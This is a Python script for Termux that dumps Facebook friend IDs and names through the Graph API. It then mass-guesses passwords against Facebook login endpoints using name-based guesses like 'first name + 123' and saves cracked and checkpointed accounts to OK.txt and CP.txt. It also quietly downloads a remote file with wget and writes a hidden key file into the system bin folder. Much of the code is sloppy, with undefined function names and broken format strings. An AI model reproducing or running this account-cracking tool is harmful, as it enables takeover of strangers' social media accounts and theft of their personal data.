#utf/8/python

import mechanize
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as profacc
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError

import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
try:
    os.remove("version.txt")
    os.remove("note.txt")
except:
    os.system("rm -rf version.txt")
    os.system("rm -rf note.txt")
import os
import sys
try:
    import requests
except ModuleNotFoundError:
    print("Currently Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("Currently Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("Sedang Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")

import requests as ress

try:
    os.system("wget https://raw.githubusercontent.com/Hamii-king-06/wahab.hacker/main/Note.txt")
    os.system("wget https://raw.githubusercontent.com/Hamii-king-06/wahab.hacker/main/Note.txt")
except:
    os.system("pkg install wget -y ")



###### 
CP = 0
OK = 0
TP = 0
loop = 0
loop = 0
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
kx = 0
Aman = 0
Cp = 0
Salah=0
ubahP = []
pwbaru = []
ok = []
cp = []
ttl = []
fw = []
id = []
lq = []
iz = []
opq = []
olq = []
data = {}
data2 = {}
mb = "https://mbasic.facebook.com"
url_mb = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]

###### 
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

try:
    import requests,calendar
except ModuleNotFoundError:
    os.system("python -m pip install requests ")
try:
    import bs4
except ModuleNotFoundError:
    os.system("python -m pip install bs4 ")
try:
    import mechanize
except ModuleNotFoundError:
    os.system("python -m pip install mechanize ")

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time

def fb():
    logo()
    print("[01] File Cloning [ No Login ]");time.sleep(0.1)
    print("[02] Dump Public Single Link  [ Login ]");time.sleep(0.1)
    print("[03] Remove Double Link [ No Login ]");time.sleep(0.1)
    print("[04] ID Separator [ No Login ] ");time.sleep(0.1)
  
    print('===================================== ')
    fbx = input("\n[->] Choose : ")
    if fbx == '' or fbx == ' ':
        fb()
    elif fbx == '2' or fbx == '02':
        dump_noob()
    elif fbx == '3' or fbx == '03':
        dupcutter()
    elif fbx == '4' or fbx == '04':
        grep()
    elif fbx == '1' or fbx == '01':
        __crack__().plerr()
    
        
    else:
        fb()

def dump_noob():
    logo()
    try:
        ___token___ = open('access_token.txt','r').read()
    except (IOError):
        login()
    ___total___ = 2
    ___file___ = input("[*] File Name : ")
    for zx in range(___total___):
        zx +=3
        ___ids___ = input("[*] Public ID Link : ")
        if ___ids___ in ['',' ']:
            dump_noob()
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open('Dump/'+___file___+'.txt' , 'a')
            file2 = ('Dump/'+___file___+'.txt')
            for a in rex['friends']['data']:
                file.write(a['id']+"|"+a['name']+'\n')
            file.close()
            ___user___ = open('Dump/'+___file___+'.txt','r').readlines()
            print("\n\n[*] Total File ID :\033[0;91m %s"%(len(___user___)))
            print("\033[0;97m[*] Dumping Successful ")
            print("[*] Dump File Save As : %s"%(file2))
            input("\n\n[*] Back")
            fb()
        except (KeyError):
            exit("\n\n\033[0;91m[*] Dumping Error ")
        except (ConnectionError):
            exit("\n\n\033[0;91m[*] PLEASE CONNECT TO INTERNET ")

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
Bilal_Haider = open
Prof_bilal = requests.get
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'    # WARNA MATI 
def login():
    os.system("rm -rf access_token.txt");logo()
    tok = input('[*] Enter Your Token : ')
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print("\n\n[*] Login Successful as " + name )
        time.sleep(1)
        fb()
    except KeyError:
        print('\n\n[*] Token Expired ')
        time.sleep(1)
        login()

def banner():
    logo()
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n\033[0mDone...')
        print('\n\033[1;92mOK : %s â€¢ CP : %s'%(str(len(ok)),str(len(cp))));exit()
        #print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
    else:
        print('\n\033[0mUps..No Results ')
        exit()
class __crack__:
    def __init__(self):
        self.id = []
    def plerr(self):
        try:
            self.apk = input('\n[â€¢] File Name or Path : ')
            self.id = Bilal_Haider(self.apk).read().splitlines()
            print('[â€¢] Total ID : %s'%(len(self.id)))
            os.system("clear")
            logo()
            print("")
            print("")
            print('[1] Type [A or 1] For Auto Password ')
            print("")
            print('[2] Type [M or 2] For Manual Password ')
            print("")
            print('===================================== ')
        except:
            print('\n[!] Dump File Not Found')
            input('\n[â€¢] Press Enter To Back');__crack__().plerr();
            
        _jokowi_kontol_ = input("Choose : ")
        if _jokowi_kontol_ in ('M', 'm','2'):
            
            
            os.system("clear")
            logo()
            print('\nUse Comma [ , ] To Separte pass ')
            while True:
                pwek = input('\nEnter Password : ')
                #print('Sandi > %s'%(pwek))
                if pwek == '':
                    print('\nDo Not Empty')
                    time.sleep(1)
                    exit()
                elif len(pwek)<=5:
                    print('\nPossward Must Be Six Digit ')
                else:
                    def _sempak_(bse=None):
                        boy = input('\nSelect : ')
                        if boy == '':
                            print('\nDo Not Empty')
                            time.sleep(1);self._sempak_()
                        elif boy == "1" or boy == "01":
                            print('\n[â€¢] Result OK saved to OK.txt')
                            print('[â€¢] Result CP saved to CP.txt')
                            print('\n\tCrack Processing...\n')
                            print('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__api__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "2" or boy == "02":
                            print('\n[â€¢] Result OK saved to OK.txt')
                            print('[â€¢] Result CP saved to CP.txt')
                            print('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
                                    except: pass
                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "3" or boy == "03":
                            print('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
                            print('[â€¢] Result CP saved to CP.txt')
                            print('\n\tCrack Processing...\n\n')
                            print('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mfb__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            #print('\nSalah')
                            exit()
                    #print('\n\t         PILIH METODE CRACK NYA')
                    os.system("clear")
                    logo()
                    print('\n\t========[ Choose Method ]========')
                    print('\n[01] Method 1 [pro] ')
                    print('[02] Method 2 ')
                    print('[03] Method 3 ')
                    print('===================================== ')
                    _sempak_(pwek.split(','))
                    break
        elif _jokowi_kontol_ in ('A', 'a','1'):
            print('\n\t========[ Choose Method ]========')
            print('\n[01] Method 1 [ Pro ] ')
            print('[02] Method 2 ')
            print('[03] Method 3 ')
            print('===================================== ')
            self.__pler__()
        else:
            #print('\nType 1 2, or 3')
            exit()
        return
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[AsadMalik] %s/%s  \033[1;92mOK-:%s â€¢ \033[1;97mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
                ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
                ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            p = Prof_Bilal("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r\033[1;92m[ELITE-OK] %s â€¢ %s%s      '%(user,pw,))
                wrt = '%s - %s %s'%(user,pw,)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    token = Bilal_Haider('login.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r\033[1;97m[ELITE-CP] %s â€¢ %s â€¢ %s %s %s%s      '%(user,pw,))
                    wrt = '%s - %s - %s %s %s%s'% (user,pw,)
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r\033[1;97m[ELITE-CP] %s â€¢ %s%s      '%(user,pw,))
                wrt = '%s - %s%s' % (user,pw,)
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[AsadMalik] %s/%s  \033[1;92mOK-:%s â€¢ \033[1;97mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
                ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
                ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;92m[ELITE-OK] %s â€¢ %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Bilal_Haider('token.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r\033[1;97m[ELITE-CP] %s â€¢ %s â€¢ %s %s %s%s      ' % (user,pw,))
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,)
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r\033[1;97m[ELITE-CP] %s â€¢ %s%s      ' % (user,pw,))
                wrt = '%s - %s%s'%(user,pw,)
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;96m[AsadMalik] %s/%s  \033[1;92mOK-:%s â€¢ \033[1;97mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
                ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
                ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;92m[ELITE-OK] %s â€¢ %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Asad('token.txt').read()
                    cp_ttl = Malik('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r\033[1;97m[ELITE-CP] %s â€¢ %s â€¢ %s %s %s%s      ' % (user,pw,))
                    wrt = '%s - %s - %s %s %s'%(user,pw,)
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r\033[1;97m[ELITE-CP] %s â€¢ %s%s      ' % (user,pw,))
                wrt = '%s - %s%s'%(user,pw,)
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n[â€¢] Choose : ')
        if yan == '':
            print('\nJangan Kosong')
            exit()
        elif yan in ('2', '02'):
            print('\n[â€¢] Result OK saved to OK.txt')
            print('[â€¢] Result CP saved to CP.txt')
            print('\n\tCrack Processing...\n')
            print('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__api__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('1', '01'):
            print('\n[â€¢] Result OK saved to OK.txt')
            print('[â€¢] Result CP saved to CP.txt')
            print('\n\tCrack Processing...\n')
            print('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"khan", xz[0]+"1122"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"khan", xz[0]+"1122"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"khan", xz[0]+"1122"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"khan", xz[0]+"1122"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"khan", xz[0]+"1122"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            #print('\n[â€¢] Result OK saved to OK.txt')
            #print('[â€¢] Result CP saved to CP.txt')
            #print('\n\tCrack Processing...\n')
            print('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
               for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('4', '04'):
            print('\n[â€¢] Result OK saved to OK.txt')
            print('[â€¢] Result CP saved to CP.txt')
            print('\n\tCrack Processing...\n')
            print('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, ]
                        elif len(xz) == 2:
                            pwx = [name, ]
                        elif len(xz) == 3:
                            pwx = [name, ]
                        elif len(xz) == 4:
                            pwx = [name, ]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            print('\nSalah')
            time.sleep(1)
            self.__pler__()
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' - 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' - 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' - 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' - 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' - 2010'
        elif fx[:6] in ['100001']          :tahunz = ' - 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' - 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' - 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' - 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' - 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' - 2015'
        elif fx[:5] in ['10001']           :tahunz = ' - 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' - 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' - 2018/2019'
        elif fx[:5] in ['10004']           :tahunz = ' - 2019/2020'
        elif fx[:5] in ['10005']           :tahunz = ' - 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' - 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' - 2008/2009'
    elif len(fx)==8:
        tahunz = ' - 2007/2008'
    elif len(fx)==7:
        tahunz = ' - 2006/2007'
    elif len(fx) in [6, 5]:
        tahunz = ' - 2005/2006'
    elif len(fx) in [4, 3, 2, 1]:
        tahunz = ' - 2004'
    else:tahunz=''
    return tahunz


try:
    idx = open('/data/data/com.termux/files/usr/bin/.mk1.2.txt', 'r').read()
except (KeyError, IOError):
    id1 = uuid.uuid4().hex[:7].upper()
    id2 = uuid.uuid4().hex[:7].upper()
    id3 = uuid.uuid4().hex[:7].upper()
    id4 = uuid.uuid4().hex[:6].upper()
    idcio = id1 + '-' +id2 + '-' + id3 + '-' + id4
    skey = open('/data/data/com.termux/files/usr/bin/.mk1.2.txt', 'w')
    skey.write(idcio)
    skey.close()
banner = """\x1b[97;1m
###     ######     ###    ########     ##     ##    ###    ##       #### ##    ##
  ## ##   ##    ##   ## ##   ##     ##    ###   ###   ## ##   ##        ##  ##   ##
 ##   ##  ##        ##   ##  ##     ##    #### ####  ##   ##  ##        ##  ##  ##
##     ##  ######  ##     ## ##     ##    ## ### ## ##     ## ##        ##  #####
#########       ## ######### ##     ##    ##     ## ######### ##        ##  ##  ##
##     ## ##    ## ##     ## ##     ##    ##     ## ##     ## ##        ##  ##   ##
##     ##  ######  ##     ## ########     ##     ## ##     ## ######## #### ##    ##

